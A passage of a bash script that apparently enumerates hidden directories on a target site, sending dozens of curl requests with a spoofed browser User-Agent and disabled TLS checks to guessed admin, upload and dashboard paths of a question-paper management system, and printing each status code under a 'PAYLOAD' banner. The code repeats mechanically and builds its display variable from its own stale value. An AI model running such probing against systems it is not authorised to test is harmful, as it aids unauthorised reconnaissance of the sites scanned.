code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation-QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation-QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModuleQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModuleQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessing_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessing_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulkTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulkTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["PlatformQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PlatformQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManager-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManager-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUploadQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUploadQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandlerControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandlerControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Control_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Control_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Suite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Suite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOps-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOps-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperPanel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperPanel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUpload_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUpload_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Uploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Uploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystem_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystem_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
